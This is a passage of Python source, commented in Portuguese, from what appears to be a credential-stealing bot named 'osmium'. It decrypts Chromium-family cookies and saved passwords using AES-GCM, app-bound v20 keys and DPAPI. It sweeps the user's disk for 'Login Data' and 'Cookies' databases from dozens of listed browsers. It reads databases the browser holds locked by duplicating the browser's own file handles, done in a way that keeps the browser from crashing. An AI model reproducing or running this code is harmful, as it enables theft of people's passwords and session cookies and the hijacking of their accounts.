            s = _clean_text(_decode_pt(cand))
            if s is not None:
                return s
    return ""


def _decrypt_chromium_value(enc: bytes, master_key: bytes | None,
                            abe_keys: list[bytes] | None = None,
                            *, cookie: bool = False) -> str:
    """Descriptografa um valor Chromium. Retorna '' quando nao ha como garantir texto puro."""
    if not enc:
        return ""
    try:
        ver = bytes(enc[:3])
        if ver in (b"v10", b"v11"):
            if not master_key or len(enc) < 3 + 12 + 16 + 1:
                return ""
            body = enc[15:]
            pt = _aead_decrypt("aesgcm", master_key, enc[3:15], body[:-16], body[-16:])
            if not pt:
                return ""
            return _pick_text(pt, cookie)
        if ver == b"v20":
            return _decrypt_v20(bytes(enc), abe_keys or [], cookie)
        # Legado (Chromium < 80): DPAPI direto, só se realmente for um blob DPAPI.
        if bytes(enc[:4]) == b"\x01\x00\x00\x00":
            return _clean_text(_decode_pt(_dpapi_decrypt(bytes(enc)))) or ""
        return ""
    except Exception:
        return ""


_SQLITE_MAGIC = b"SQLite format 3\x00"
_HANDLE_QUERY: dict = {"ts": 0.0, "data": None}


def _db_label(path: str) -> str:
    """Nome curto de uma BD ('Network\\Cookies', 'Login Data')."""
    try:
        parts = os.path.normpath(path).split(os.sep)
        return "\\".join([p for p in parts[-2:] if p]) or os.path.basename(path)
    except Exception:
        return os.path.basename(path)


# famílias com caminho fixo documentado (o resto é descoberto)
_CHROMIUM_FIXED_FAMS = {"chrome", "chrome-beta", "chrome-dev", "chrome-canary",
                        "edge", "brave", "vivaldi", "opera", "opera-gx"}


# Fragmentos de caminho (minúsculos) que identificam um NAVEGADOR.
# Esta é a lista branca da coleta de cookies: só entra o que aqui estiver.
# Usada para classificar QUALQUER caminho — não só os fixos — para apanhar
# variantes (Beta/Nightly/Canary), forks com pastas próprias e instalações
# fora do habitual.
# Uma app Electron (VS Code, Discord, CapCut, Outlook, Studio3T, a WebView2
# de uma UWP…) guarda 'Cookies' exatamente no mesmo formato, mas não aparece
# aqui => fica de fora da coleta.
_BROWSER_PATH_KEYS: tuple[tuple[str, str], ...] = (
    # --- Chromium principais -------------------------------------------
    ("google\\chrome", "chrome"),
    ("chromium", "chrome"),
    ("chrome", "chrome"),
    ("microsoft\\edge", "edge"),
    ("brave", "brave"),
    ("opera software", "opera"),
    ("vivaldi", "vivaldi"),
    ("helium", "helium"),
    # --- forks / alternativas ------------------------------------------
    ("yandex", "yandex"),
    ("thorium", "thorium"),
    ("iridium", "iridium"),
    ("slimjet", "slimjet"),
    ("centbrowser", "cent"),
    ("comodo dragon", "dragon"),
    ("avast", "avast"),
    ("avg secure", "avg"),
    ("whale", "whale"),
    ("kiwi", "kiwi"),
    ("maxthon", "maxthon"),
    ("falkon", "falkon"),
    ("blisk", "blisk"),
    ("coccoc", "coccoc"),
    ("torch", "torch"),
    ("srware", "iron"),
    ("qutebrowser", "qutebrowser"),
    ("samsung\\internet", "samsung"),
    ("samsung internet", "samsung"),
    ("arc\\user data", "arc"),
    # --- Geckos (Firefox e forks): os cookies saem de _collect_firefox_cookies
    ("mozilla\\firefox", "firefox"),
    ("waterfox", "waterfox"),
    ("librewolf", "librewolf"),
    ("floorp", "floorp"),
    ("pale moon", "palemoon"),
    ("seamonkey", "seamonkey"),
    ("basilisk", "basilisk"),
    ("mullvad browser", "mullvad"),
    ("tor browser", "torbrowser"),
)


def _browser_family_from_path(path: str) -> str | None:
    """Classifica um caminho como instalação de navegador (ou None).

    (Nome deliberadamente diferente de _browser_family(browser), que normaliza
    o label de um cookie — são coisas distintas e este tem de vir primeiro.)
    """
    p = os.path.normpath(path).lower()
    for key, fam in _BROWSER_PATH_KEYS:
        if key in p:
            return fam
    return None


def _is_browser_path(path: str) -> bool:
    """True se o caminho pertence a um NAVEGADOR (nunca a uma app comum).

    É o filtro da coleta de cookies: 'só navegadores'. Um VS Code, um Discord,
    um CapCut, o Outlook ou a WebView2 de uma app empacotada têm todos uma BD
    'Cookies' — mas não são navegadores, por isso ficam de fora.
    """
    return _browser_family_from_path(path) is not None



def _has_profile_cookies(root: str) -> bool:
    """True se a raiz tem perfis com BD de cookies/login (é mesmo um browser)."""
    try:
        for n in os.listdir(root):
            if n != "Default" and not n.startswith("Profile "):
                continue
            p = os.path.join(root, n)
            for c in ("Cookies", os.path.join("Network", "Cookies"), "Login Data"):
                if os.path.isfile(os.path.join(p, c)):
                    return True
    except OSError:
        return False
    return False


def _sweep_local_state_roots(max_depth: int = 3) -> list[str]:
    """Todas as pastas com 'Local State' sob os locais padrão.

    É isto que encontra navegadores que os caminhos fixos não prevem: variantes
    (Beta/Nightly), forks em pastas próprias e instalações fora do habitual.
    Não entra no %TEMP% (perfis headless descartados) e não desce para dentro
    de uma raiz já encontrada.
    """
    tmp = os.environ.get("TEMP", "")
    tmp = os.path.normcase(os.path.abspath(tmp)) if tmp else ""
    bases = [b for b in (
        os.environ.get("LOCALAPPDATA", ""),
        os.environ.get("APPDATA", ""),
        os.environ.get("PROGRAMFILES", ""),
        os.environ.get("PROGRAMFILES(X86)", ""),
    ) if b and os.path.isdir(b)]
    out: list[str] = []
    for base in bases:
        stack: list[tuple[str, int]] = [(base, 0)]
        while stack:
            d, depth = stack.pop()
            try:
                nd = os.path.normcase(os.path.abspath(d))
                if tmp and (nd == tmp or nd.startswith(tmp + os.sep)):
                    continue
                entries = list(os.scandir(d))
            except OSError:
                continue
            if any(e.name == "Local State" for e in entries):
                out.append(d)
                continue                      # já é raiz, não é preciso descer
            if depth >= max_depth:
                continue
            for e in entries:
                try:
                    if e.is_dir(follow_symlinks=False):
                        stack.append((e.path, depth + 1))
                except OSError:
                    continue
    return out


def _unknown_browser_roots() -> list[str]:
    """Raizes com cookies de perfil que a classificação NÃO reconhece.

    Vão para o log como 'sem classificação': é assim que se descobre que há um
    navegador novo na máquina (basta acrescentar uma linha a _BROWSER_PATH_KEYS).
    """
    out: list[str] = []
    for root in _sweep_local_state_roots():
        if _browser_family_from_path(root) is None and _has_profile_cookies(root):
            out.append(root)
    return out


def _chromium_roots() -> list[tuple[str, str]]:
    """(família, pasta 'User Data') de cada navegador Chromium instalado.

    Dois passes: os caminhos fixos (rápidos e com nome de família exacto) e um
    varrimento genérico por 'Local State' que apanha qualquer outra instalação
    — é este o passo que faz o bot encontrar browsers que não estavam previstos.
    Só entram pastas com 'Local State' (instalação a sério) e perfis com cookies.
    """
    import glob as _glob

    local = os.environ.get("LOCALAPPDATA", "")
    roaming = os.environ.get("APPDATA", "")
    pf = os.environ.get("PROGRAMFILES", "")
    pf86 = os.environ.get("PROGRAMFILES(X86)", "")
    out: list[tuple[str, str]] = []
    seen: set[str] = set()

    def add(fam: str, root: str) -> None:
        if not root:
            return
        try:
            key = os.path.normcase(os.path.abspath(root))
            if key in seen or not os.path.isfile(os.path.join(root, "Local State")):
                return
        except (OSError, ValueError):
            return
        seen.add(key)
        out.append((fam, root))

    # --- passo 1: caminhos fixos conhecidos -------------------------------
    if local:
        add("chrome", os.path.join(local, r"Google\Chrome\User Data"))
        add("chrome-beta", os.path.join(local, r"Google\Chrome Beta\User Data"))
        add("chrome-dev", os.path.join(local, r"Google\Chrome Dev\User Data"))
        add("chrome-canary", os.path.join(local, r"Google\Chrome SxS\User Data"))
        add("edge", os.path.join(local, r"Microsoft\Edge\User Data"))
        add("brave", os.path.join(local, r"BraveSoftware\Brave-Browser\User Data"))
        add("vivaldi", os.path.join(local, r"Vivaldi\User Data"))
    if roaming:
        add("opera", os.path.join(roaming, r"Opera Software\Opera Stable"))
        add("opera-gx", os.path.join(roaming, r"Opera Software\Opera GX Stable"))
        add("helium", os.path.join(roaming, r"Helium\User Data"))
    # fora dos caminhos fixos (Helium em %LOCALAPPDATA%\imput\Helium, etc.)
    for base in (b for b in (local, roaming, pf, pf86) if b):
        for pat in (os.path.join(base, "*Helium*", "User Data"),
                    os.path.join(base, "*", "*Helium*", "User Data"),
                    os.path.join(base, "Helium", "User Data")):
            try:
                for root in _glob.glob(pat):
                    add("helium", root)
            except Exception:
                continue

    # --- passo 2: varrimento genérico (qualquer outro navegador) ---------
    for root in _sweep_local_state_roots():
        fam = _browser_family_from_path(root)
        if not fam:
            continue                      # não é navegador conhecido (app Electron)
        if not _has_profile_cookies(root):
            continue                      # tem Local State mas não guarda cookies
        add(fam, root)
    return out


def _short_path(p: str) -> str:
    """Caminho relativo a LOCALAPPDATA/APPDATA/PROGRAMFILES (para o log)."""
    for env in ("LOCALAPPDATA", "APPDATA", "PROGRAMFILES", "PROGRAMFILES(X86)"):
        v = os.environ.get(env, "")
        if not v:
            continue
        try:
            vp = os.path.normcase(os.path.abspath(v))
            ap = os.path.normcase(os.path.abspath(p))
            if ap.startswith(vp + os.sep):
                return os.path.relpath(p, v)
        except (OSError, ValueError):
            continue
    return p


def _chromium_profile_bases() -> list[tuple[str, str]]:
    """Bases 'User Data' a varrer em busca de Default/Profile *."""
    return list(_chromium_roots())


# pastas que não identificam a loja (perfis genéricos e contentores do Chromium)
_GENERIC_STORE_DIRS = frozenset({
    "default", "guest profile", "system profile", "user data",
    "ebwebview", "webview2", "localstate", "local state", "packages",
    "appdata", "local", "roaming",
    # contentores internos de um perfil — andam sempre com o 'Cookies'
    "network", "partitions", "cef", "cache",
})


def _slug_store_name(seg: str) -> str:
    """'Microsoft.Windows.Photos_8wek...' -> 'photos'; 'Studio3T' -> 'studio3t'."""
    s = seg.split("_", 1)[0]            # deita fora o sufixo de pacote
    s = s.rsplit(".", 1)[-1]            # deita fora o namespace
    return re.sub(r"[^0-9a-z]+", "", s.lower())


def _store_label(path: str) -> str:
    """Que loja/navegador é dono de uma BD do Chromium ('Login Data', 'Cookies').

    Primeiro o caminho conhecido (dá a família exacta: edge, brave, helium…);
    se não houver, sobe do ficheiro até à primeira pasta que não seja perfil
    nem contentor genérico — é assim que as BDs embutidas em apps WebView2
    (Studio3T, Outlook, SharedWebView…) ganham um nome próprio em vez de
    ficarem sem classificação.
    """
    fam = _browser_family_from_path(path)
    if fam:
        return fam
    parts = [p for p in os.path.normpath(path).split(os.sep) if p]
    if len(parts) < 2:
        return "desconhecido"
    for seg in reversed(parts[:-1]):    #[:-1] deita fora o próprio ficheiro
        low = seg.lower()
        if (low in _GENERIC_STORE_DIRS or low.startswith("profile ")
                or re.fullmatch(r"wv2profile_.*", low)):
            continue
        return _slug_store_name(seg) or "desconhecido"
    return _slug_store_name(parts[-2]) or "desconhecido"


# nome antigo (só senhas) — mesmo código, agora serve para senhas e cookies
_login_store_label = _store_label


def _nearest_local_state(path: str) -> str:
    """'Local State' mais próximo a subir do ficheiro (a chave mestra certa)."""
    d = os.path.dirname(os.path.abspath(path))
    while True:
        ls = os.path.join(d, "Local State")
        if os.path.isfile(ls):
            return ls
        nd = os.path.dirname(d)
        if nd == d:
            return ""
        d = nd


def _sweep_login_data(max_depth: int = 7,
                      max_dirs: int = 60000) -> list[tuple[str, str, str]]:
    """Todos os 'Login Data' do sistema: (loja, caminho, Local State).

    É para as senhas o que _sweep_local_state_roots é para as cookies: não
    depende de caminhos fixos, apanha variantes, perfis e as BDs embutidas em
    apps WebView2. Não entra no %TEMP% (perfis headless descartados).
    """
    tmp = os.environ.get("TEMP", "")
    tmp = os.path.normcase(os.path.abspath(tmp)) if tmp else ""
    bases = [b for b in (os.environ.get("LOCALAPPDATA", ""),
                         os.environ.get("APPDATA", ""))
             if b and os.path.isdir(b)]
    out: list[tuple[str, str, str]] = []
    seen: set[str] = set()
    walked = 0
    for base in bases:
        stack: list[tuple[str, int]] = [(base, 0)]
        while stack:
            d, depth = stack.pop()
            walked += 1
            if walked > max_dirs:
                return out
            try:
                nd = os.path.normcase(os.path.abspath(d))
                if tmp and (nd == tmp or nd.startswith(tmp + os.sep)):
                    continue
                entries = list(os.scandir(d))
            except OSError:
                continue
            for e in entries:
                try:
                    if e.is_file(follow_symlinks=False):
                        if e.name not in ("Login Data", "Login Data For Account"):
                            continue
                        key = os.path.normcase(e.path)
                        if key in seen:
                            continue
                        seen.add(key)
                        out.append((_store_label(e.path), e.path,
                                    _nearest_local_state(e.path)))
                    elif e.is_dir(follow_symlinks=False) and depth < max_depth:
                        if e.name.lower() in _SWEEP_SKIP_DIRS:
                            continue
                        stack.append((e.path, depth + 1))
                except OSError:
                    continue
    return out


# Pastas que nunca guardam um perfil de navegador — saltá-las mantém o
# varrimento rápido sem perder nada: os cookies vivem sempre em
# <perfil>/Cookies ou <perfil>/Network/Cookies, nunca dentro destas.
# (NÃO entra 'cache' de propósito: o CapCut guarda os cookies em User Data\CEF\Cache.)
_SWEEP_SKIP_DIRS = frozenset({
    "node_modules", ".git", ".svn", ".hg", "__pycache__", "logs",
    "code cache", "gpucache", "grshadercache", "dawncache", "shadercache",
    "crashpad", "safe browsing", "service worker", "local storage",
    "session storage", "indexeddb", "blob_storage", "file system",
    "application cache", "component_crx_cache", "extensions_state",
    "optimization_guide_model_store", "segmentation platform",
    "browsermetrics", "coverage", "download service", "affiliationdatabase",
    "autofillstates", "certificaterevocation", "certificatetransparency",
    "trust tokens", "webstorelicenses", "recipientinfo", "smartcard",
    "federatedidentityapi", "ondeviceheadsuggestmodel", "web applications",
    "third party modules", "temp", "installer", "source cache",
    # interior de uma app empacotada (os dados de perfil estão em LocalState)
    "ac", "localcache", "roamingstate", "settings", "tempstate",
    "systemappdata", "systemdatacache", "extensions",
})


# Contagem da última varredura de cookies — serve para o log dizer quantas BDs
# existem no disco e quantas são mesmo de navegadores (as outras ficam de fora).
_COOKIE_SWEEP_STATS: dict = {"total": 0, "browser": 0, "skip": 0}


def _sweep_cookie_dbs(max_depth: int = 8,
                      max_dirs: int = 60000) -> list[tuple[str, str, str]]:
    """BDs 'Cookies' de NAVEGADORES: (loja, caminho, Local State).

    É o equivalente de _sweep_login_data para as cookies. Em vez de confiar em
    caminhos fixos — que só prevêem chrome/edge/brave/opera/vivaldi e deixam de
    fora tudo o que está embutido — varre os discos por qualquer ficheiro
    'Cookies'. É isto que apanha os forks que nenhum caminho fixo conhece e as
    variantes fundas (ex.: Edge / OneAuth / WebView2). Não entra no %TEMP%
    (perfis headless descartados).

    SÓ entra o que _is_browser_path reconhecer como navegador: apps Electron
    (VS Code, Discord, CapCut, Outlook, Studio3T, UWP…) guardam 'Cookies' no
    mesmo formato mas não são navegadores — ficam de fora. O que foi de fora
    fica contado em _COOKIE_SWEEP_STATS para o log.

    max_depth=8 e não 7: um 'Login Data' fica em <perfil>/, mas os cookies
    modernos ficam em <perfil>/Network/Cookies — um nível mais fundo (e o
    caso mais fundo aqui é Edge / OneAuth / WebView2 / EBWebView / Default).
    """
    tmp = os.environ.get("TEMP", "")
    tmp = os.path.normcase(os.path.abspath(tmp)) if tmp else ""
    bases = [b for b in (os.environ.get("LOCALAPPDATA", ""),
                         os.environ.get("APPDATA", ""))
             if b and os.path.isdir(b)]
    out: list[tuple[str, str, str]] = []
    seen: set[str] = set()
    walked = 0
    n_total = n_browser = 0
    for base in bases:
        stack: list[tuple[str, int]] = [(base, 0)]
        while stack:
            d, depth = stack.pop()
            walked += 1
            if walked > max_dirs:
                _COOKIE_SWEEP_STATS["total"] = n_total
                _COOKIE_SWEEP_STATS["browser"] = n_browser
                _COOKIE_SWEEP_STATS["skip"] = n_total - n_browser
                return out
            try:
                nd = os.path.normcase(os.path.abspath(d))
                if tmp and (nd == tmp or nd.startswith(tmp + os.sep)):
                    continue
                entries = list(os.scandir(d))
            except OSError:
                continue
            for e in entries:
                try:
                    if e.is_file(follow_symlinks=False):
                        if e.name != "Cookies":
                            continue
                        n_total += 1
                        if not _is_browser_path(e.path):
                            continue              # não é navegador: não coleta
                        n_browser += 1
                        key = os.path.normcase(e.path)
                        if key in seen:
                            continue
                        seen.add(key)
                        out.append((_store_label(e.path), e.path,
                                    _nearest_local_state(e.path)))
                    elif e.is_dir(follow_symlinks=False) and depth < max_depth:
                        if e.name.lower() in _SWEEP_SKIP_DIRS:
                            continue
                        stack.append((e.path, depth + 1))
                except OSError:
                    continue
    _COOKIE_SWEEP_STATS["total"] = n_total
    _COOKIE_SWEEP_STATS["browser"] = n_browser
    _COOKIE_SWEEP_STATS["skip"] = n_total - n_browser
    return out


def _nt_query_handles(max_age: float = 5.0) -> list[tuple[int, int]]:
    """Enumera todos os handles do sistema como [(pid, handle_value), ...].

    Usa NtQuerySystemInformation(SystemExtendedHandleInformation) — não exige
    admin. Os valores são copiados para uma lista de tuplos enquanto o buffer
    está vivo (nunca devolver ponteiros para o buffer).
    """
    import time
    import ctypes
    from ctypes import wintypes as W

    now = time.monotonic()
    cached = _HANDLE_QUERY.get("data")
    if isinstance(cached, list) and (now - float(_HANDLE_QUERY.get("ts", 0.0))) < max_age:
        return list(cached)

    class ENTRY(ctypes.Structure):
        _fields_ = [("Object", ctypes.c_void_p),
                    ("UniqueProcessId", ctypes.c_size_t),
                    ("HandleValue", ctypes.c_size_t),
                    ("GrantedAccess", W.ULONG),
                    ("CreatorBackTraceIndex", W.USHORT),
                    ("ObjectTypeIndex", W.USHORT),
                    ("HandleAttributes", W.ULONG),
                    ("Reserved", W.ULONG)]

    class INFO(ctypes.Structure):
        _fields_ = [("NumberOfHandles", ctypes.c_size_t),
                    ("Reserved", ctypes.c_size_t),
                    ("Handles", ENTRY * 1)]

    SystemExtendedHandleInformation = 64
    STATUS_INFO_LENGTH_MISMATCH = 0xC0000004
    nt = ctypes.WinDLL("ntdll")
    qsi = nt.NtQuerySystemInformation
    qsi.restype = ctypes.c_long
    qsi.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]

    size = 1 << 20
    last_ret = 0
    for _ in range(16):
        buf = ctypes.create_string_buffer(size)
        ret = qsi(SystemExtendedHandleInformation, buf, size, None) & 0xFFFFFFFF
        last_ret = ret
        if ret == STATUS_INFO_LENGTH_MISMATCH:
            size *= 2
            continue
        if ret != 0:
            raise OSError(f"NtQuerySystemInformation=0x{ret:08X}")
        info = ctypes.cast(buf, ctypes.POINTER(INFO)).contents
        n = int(info.NumberOfHandles)
        arr = ctypes.cast(ctypes.addressof(info.Handles), ctypes.POINTER(ENTRY))
        data = [(int(arr[i].UniqueProcessId), int(arr[i].HandleValue)) for i in range(n)]
        _HANDLE_QUERY["ts"] = now
        _HANDLE_QUERY["data"] = data
        return list(data)
    raise OSError(f"handle buffer insuficiente (0x{last_ret:08X})")


def _db_images(path: str) -> set[str]:
    """Exe(s) que provavelmente mantêm esta BD aberta."""
    p = (path or "").replace("/", "\\").lower()
    imgs: set[str] = set()
    if "microsoft\\edge" in p or "\\edge\\" in p:
        imgs.add("msedge.exe")
    if "bravesoftware" in p:
        imgs.add("brave.exe")
    if "google\\chrome" in p:
        imgs.add("chrome.exe")
    # Helium: distribuído à parte e o binário chama-se chrome.exe; noutros
    # empacotamentos pode chamar-se helium.exe.
    if "helium" in p or "\\imput\\" in p:
        imgs.update({"chrome.exe", "helium.exe"})
    if "\\vivaldi\\" in p or p.endswith("\\vivaldi"):
        imgs.add("vivaldi.exe")
    if "opera software" in p:
        imgs.update({"opera.exe", "opera_gx.exe"})
    if "mozilla\\firefox" in p:
        imgs.add("firefox.exe")
    return imgs


def _pids_by_image(names: set[str]) -> list[int]:
    """Pids cujo executável está em `names` (Toolhelp32, sem shell)."""
    if not names:
        return []
    import ctypes
    from ctypes import wintypes as W

    TH32CS_SNAPPROCESS = 0x2

    class PROCESSENTRY32(ctypes.Structure):
        _fields_ = [
            ("dwSize", W.DWORD), ("cntUsage", W.DWORD),
            ("th32ProcessID", W.DWORD),
            ("th32DefaultHeapID", ctypes.c_size_t),
            ("th32ModuleID", W.DWORD), ("cntThreads", W.DWORD),
            ("th32ParentProcessID", W.DWORD),
            ("pcPriClassBase", ctypes.c_long), ("dwFlags", W.DWORD),
            ("szExeFile", ctypes.c_wchar * 260),
        ]

    k32 = _kernel32_e()
    # HANDLE é de 64 bits: sem restype explícito o ctypes trunca em c_int.
    k32.CreateToolhelp32Snapshot.restype = ctypes.c_void_p
    k32.CreateToolhelp32Snapshot.argtypes = [W.DWORD, W.DWORD]
    k32.Process32FirstW.argtypes = [ctypes.c_void_p, ctypes.POINTER(PROCESSENTRY32)]
    k32.Process32FirstW.restype = W.BOOL
    k32.Process32NextW.argtypes = [ctypes.c_void_p, ctypes.POINTER(PROCESSENTRY32)]
    k32.Process32NextW.restype = W.BOOL
    k32.CloseHandle.argtypes = [ctypes.c_void_p]
    snap = k32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if not snap or snap == 0xFFFFFFFF:
        return []
    try:
        ent = PROCESSENTRY32()
        ent.dwSize = ctypes.sizeof(PROCESSENTRY32)
        if not k32.Process32FirstW(snap, ctypes.byref(ent)):
            return []
        out: list[int] = []
        while True:
            name = (ent.szExeFile or "").lower()
            if name in names:
                out.append(int(ent.th32ProcessID))
            if not k32.Process32NextW(snap, ctypes.byref(ent)):
                break
        return out
    finally:
        try:
            k32.CloseHandle(snap)
        except Exception:
            pass


class _MEMORY_BASIC_INFORMATION(ctypes.Structure):
    """Layout x64: DWORD + WORD + padding, RegionSize alinhado a 8 bytes."""
    _fields_ = [
        ("BaseAddress", ctypes.c_void_p),
        ("AllocationBase", ctypes.c_void_p),
        ("AllocationProtect", ctypes.c_ulong),
        ("PartitionId", ctypes.c_ushort),
        ("RegionSize", ctypes.c_size_t),
        ("State", ctypes.c_ulong),
        ("Protect", ctypes.c_ulong),
        ("Type", ctypes.c_ulong),
    ]


_KERNEL32_E = None


def _kernel32_e():
    """kernel32 com use_last_error=True e restype/argtypes explícitos.

    HANDLE/size_t precisam de restype de 64 bits: sem isso o ctypes trunca.
    """
    global _KERNEL32_E
    if _KERNEL32_E is None:
        from ctypes import wintypes as W

        k = ctypes.WinDLL("kernel32", use_last_error=True)
        k.GetFileSize.argtypes = [ctypes.c_void_p, ctypes.POINTER(W.DWORD)]
        k.GetFileSize.restype = W.DWORD
        k.GetFileType.argtypes = [ctypes.c_void_p]
        k.GetFileType.restype = W.DWORD
        k.OpenProcess.argtypes = [W.DWORD, W.BOOL, W.DWORD]
        k.OpenProcess.restype = ctypes.c_void_p
        k.GetCurrentProcess.restype = ctypes.c_void_p
        # Mapeamento é a única forma de ler sem emitir I/O pelo handle do
        # ficheiro: ReadFile coloca completion packets no port do browser e/ou
        # move o file pointer -> o browser morre.
        k.CreateFileMappingW.argtypes = [ctypes.c_void_p, ctypes.c_void_p, W.DWORD,
                                         W.DWORD, W.DWORD, W.LPCWSTR]
        k.CreateFileMappingW.restype = W.HANDLE
        k.MapViewOfFile.argtypes = [ctypes.c_void_p, W.DWORD, W.DWORD, W.DWORD, W.DWORD]
        k.MapViewOfFile.restype = ctypes.c_void_p
        k.UnmapViewOfFile.argtypes = [ctypes.c_void_p]
        k.UnmapViewOfFile.restype = W.BOOL
        k.VirtualQuery.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t]
        k.VirtualQuery.restype = ctypes.c_size_t
        k.CloseHandle.argtypes = [ctypes.c_void_p]
        k.CloseHandle.restype = W.BOOL
        _KERNEL32_E = k
    return _KERNEL32_E


def _map_read(h: int, n: int) -> bytes | None:
    """Lê os `n` primeiros bytes de um ficheiro via mapeamento de memória.

    CreateFileMappingW(PAGE_READONLY) + MapViewOfFile(FILE_MAP_READ) +
    string_at. Ao contrário do ReadFile, não emite IRP pelo handle, não gera
    completion packets no port de I/O do browser e não mexe no file pointer.
    A região devolvida por VirtualQuery serve de tecto para não ler para além
    do fim do mapeamento (o ficheiro pode encolher entre o GetFileSize e aqui).
    """
    if n <= 0:
        return None
    k32 = _kernel32_e()
    PAGE_READONLY = 0x02
    FILE_MAP_READ = 0x0004
    hm = k32.CreateFileMappingW(ctypes.c_void_p(h), None, PAGE_READONLY, 0, 0, None)
    if not hm:
        return None
    try:
        view = k32.MapViewOfFile(ctypes.c_void_p(hm), FILE_MAP_READ, 0, 0, 0)
        if not view:
            return None
        try:
            mbi = _MEMORY_BASIC_INFORMATION()
            if not k32.VirtualQuery(ctypes.c_void_p(view), ctypes.byref(mbi),
                                    ctypes.sizeof(mbi)):
                return None
            region = int(mbi.RegionSize or 0)
            if region <= 0:
                return None
            want = min(int(n), region)
            if want <= 0:
                return None
            return ctypes.string_at(view, want)
        finally:
            try:
                k32.UnmapViewOfFile(ctypes.c_void_p(view))
            except Exception:
                pass
    finally:
        try:
            k32.CloseHandle(ctypes.c_void_p(hm))
        except Exception:
            pass


def _sqlite_has_table(data: bytes, table: str) -> bool:
    """Valida que `data` é uma sqlite legível que contém `table`."""
    if not data or not table:
        return False
    import sqlite3
    import tempfile

    ok = False
    fd, tmp = tempfile.mkstemp(prefix="hdl_", suffix=".db")
    os.close(fd)
    try:
        with open(tmp, "wb") as f:
            f.write(data)
        con = sqlite3.connect(tmp)
        try:
            row = con.execute(
                "SELECT count(*) FROM sqlite_master WHERE type='table' AND name=?",
                (table,)).fetchone()
            if row and int(row[0]) == 1:
                quoted = '"' + table.replace('"', '""') + '"'
                con.execute(f"SELECT count(*) FROM {quoted}").fetchone()
                ok = True
        finally:
            try:
                con.close()
            except Exception:
                pass
    except Exception:
        ok = False
    finally:
        try:
            os.remove(tmp)
        except OSError:
            pass
    return ok


def _read_db_via_handle(path: str, table: str) -> bytes | None:
    """Lê uma BD bloqueada duplicando o handle que o browser já tem aberto.

    Não fecha nem altera o handle original: NtDuplicateObject(processo-alvo,
    handle) + leitura por mapeamento de memória (nunca ReadFile — isso fecha o
    navegador). Não exige admin.
    """
    import time
    import ctypes
    from ctypes import wintypes as W

    if not table or not os.path.isfile(path):
        return None
    try:
        want = os.path.getsize(path)
    except OSError:
        return None
    if want <= 0 or want > 64 * 1024 * 1024:
        return None
    try:
        entries = _nt_query_handles()
    except Exception as e:
        _log_once(f"[osmium] NtQuerySystemInformation: {e}")
        return None

    imgs = _db_images(path) | {"msedge.exe", "brave.exe", "chrome.exe"}
    pids = set(_pids_by_image(imgs))
    if not pids:
        _log_once(f"[osmium] handle-read: sem processos {sorted(imgs)} para {_db_label(path)}")
        return None

    k32 = _kernel32_e()

    nt = ctypes.WinDLL("ntdll")
    dup = nt.NtDuplicateObject
    dup.restype = ctypes.c_long
    dup.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
                    ctypes.POINTER(ctypes.c_void_p), W.ULONG, W.ULONG, W.ULONG]

    PROCESS_DUP_HANDLE = 0x40
    DUPLICATE_SAME_ACCESS = 0x2
    FILE_TYPE_DISK = 1

    proc: dict[int, int] = {}
    deadline = time.monotonic() + 12.0
    exact: bytes | None = None
    by_schema: bytes | None = None
    marker = b"create table " + table.lower().encode("ascii", errors="ignore")

    try:
        for pid, hv in entries:
            if pid not in pids:
                continue
            if time.monotonic() > deadline:
                break
            h = proc.get(pid)
            if not h:
                h = int(k32.OpenProcess(PROCESS_DUP_HANDLE, False, pid) or 0)
                proc[pid] = h
            if not h:
                continue
            newh = ctypes.c_void_p()
            st = dup(ctypes.c_void_p(h), ctypes.c_void_p(hv),
                     ctypes.c_void_p(k32.GetCurrentProcess()),
                     ctypes.byref(newh), 0, 0, DUPLICATE_SAME_ACCESS)
            if st != 0 or not newh.value:
                continue
            th = int(newh.value)
            try:
                if k32.GetFileType(ctypes.c_void_p(th)) != FILE_TYPE_DISK:
                    continue
                lo = k32.GetFileSize(ctypes.c_void_p(th), None)
                if lo in (0, 0xFFFFFFFF):
                    continue
                head = _map_read(th, 16)
                if head != _SQLITE_MAGIC:
                    continue
                if lo == want:
                    data = _map_read(th, lo)
                    if data and _sqlite_has_table(data, table):
                        exact = data
                        break
                elif by_schema is None and lo <= 64 * 1024 * 1024:
                    probe = _map_read(th, min(lo, 512 * 1024))
                    if probe and marker in probe.lower():
                        data = _map_read(th, lo)
                        if data and _sqlite_has_table(data, table):
                            by_schema = data
            except Exception:
                continue
            finally:
                try:
                    k32.CloseHandle(ctypes.c_void_p(th))
                except Exception:
                    pass
    finally:
        for h in proc.values():
            try:
                if h:
                    k32.CloseHandle(ctypes.c_void_p(h))
            except Exception:
                pass

    data = exact or by_schema
    if data:
        _log_once(f"[osmium] {_db_label(path)} lido via handle duplicado "
                  f"({len(data)} bytes, tabela {table})")
    else:
        _log_once(f"[osmium] {_db_label(path)} bloqueada e sem handle legível (tabela {table})")
    return data


def _copy_to_temp(src: str, table: str | None = None) -> str | None:
    import shutil
    import tempfile

    # O navegador mantém a BD com lock exclusivo durante as escritas — tenta algumas vezes.
    # As cópias ficam na pasta privada (não no %TEMP% genérico) e são varridas no arranque.
    tmpdir = _private_tmp()
    last: str | None = None
    for attempt in range(4):
        fd, tmp = tempfile.mkstemp(prefix="ck_", suffix=".db", dir=tmpdir)
        os.close(fd)
        try:
            shutil.copy2(src, tmp)
            return tmp
        except Exception as e:
            last = str(e)
            try:
                os.remove(tmp)
            except Exception:
                pass
            if attempt < 3:
                import time as _time

                _time.sleep(0.3)
    # lock persistente: lê via handle já aberto pelo próprio browser
    if table:
        data = None
        try:
            data = _read_db_via_handle(src, table)
        except Exception as e:
            _log_once(f"[osmium] handle-read falhou ({_db_label(src)}): {type(e).__name__}: {e}")
        if data:
            tmp = None
            try:
                fd, tmp = tempfile.mkstemp(prefix="ck_", suffix=".db", dir=tmpdir)
                os.close(fd)
                with open(tmp, "wb") as f:
                    f.write(data)
                return tmp
            except Exception as e:
                _log_once(f"[osmium] handle-read nao utilizavel ({_db_label(src)}): {e}")
                if tmp:
                    try:
                        os.remove(tmp)
                    except Exception:
                        pass
    if last:
        _log_once(f"[osmium] BD bloqueada ({_db_label(src)}): {last}")
    return None


def _collect_chromium_cookies() -> tuple[list[dict], list[tuple[str, bytes]], dict[str, dict]]:
    import glob

